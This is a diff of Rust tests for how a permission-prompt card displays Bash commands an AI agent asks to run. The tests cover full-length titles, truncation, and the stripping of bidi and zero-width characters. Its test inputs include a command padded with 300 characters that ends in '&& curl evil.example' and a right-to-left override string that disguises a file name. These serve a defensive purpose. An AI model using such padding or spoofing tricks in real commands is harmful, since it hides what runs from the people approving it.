@@ -1,6 +1,7 @@
 use serde_json::json;
 
 use super::*;
+use crate::session::prompt_title;
 
 fn line(value: Value) -> ClaudeLine {
     parse_line(&value.to_string())
@@ -347,6 +348,45 @@ fn can_use_tool_without_tool_use_id_has_no_call_id() {
     assert_eq!(ask.title, "Bash: ls");
     assert!(ask.paths.is_empty());
     assert!(ask.options.iter().all(|option| option.id != "allow_always"));
+}
+
+fn bash_ask(command: &str) -> PermissionAsk {
+    let parsed = line(json!({
+        "type": "control_request",
+        "request_id": "req-3",
+        "request": {"subtype": "can_use_tool", "tool_name": "Bash", "input": {"command": command}},
+    }));
+    let ClaudeLine::Permission { ask, .. } = parsed else {
+        panic!("expected permission");
+    };
+    ask
+}
+
+#[test]
+fn bash_ask_title_keeps_the_whole_command_for_the_card() {
+    let command = format!("{} && curl evil.example", "x".repeat(300));
+
+    let ask = bash_ask(&command);
+
+    assert_eq!(ask.title, format!("Bash: {command}"));
+    let shown = prompt_title(&ask.title, &ask.kind);
+    assert!(shown.ends_with("&& curl evil.example"), "{shown}");
+}
+
+#[test]
+fn bash_ask_title_over_the_card_limit_is_cut_with_a_marker() {
+    let ask = bash_ask(&"y".repeat(2100));
+
+    let shown = prompt_title(&ask.title, &ask.kind);
+
+    assert_eq!(shown, format!("Bash: {} …", "y".repeat(1994)));
+}
+
+#[test]
+fn bash_ask_title_loses_bidi_and_zero_width_chars_on_the_card() {
+    let ask = bash_ask("ls\u{202E}txt.exe\u{200B}\u{2066}x\u{FEFF}");
+
+    assert_eq!(prompt_title(&ask.title, &ask.kind), "Bash: ls txt.exe x");
 }
 
 #[test]
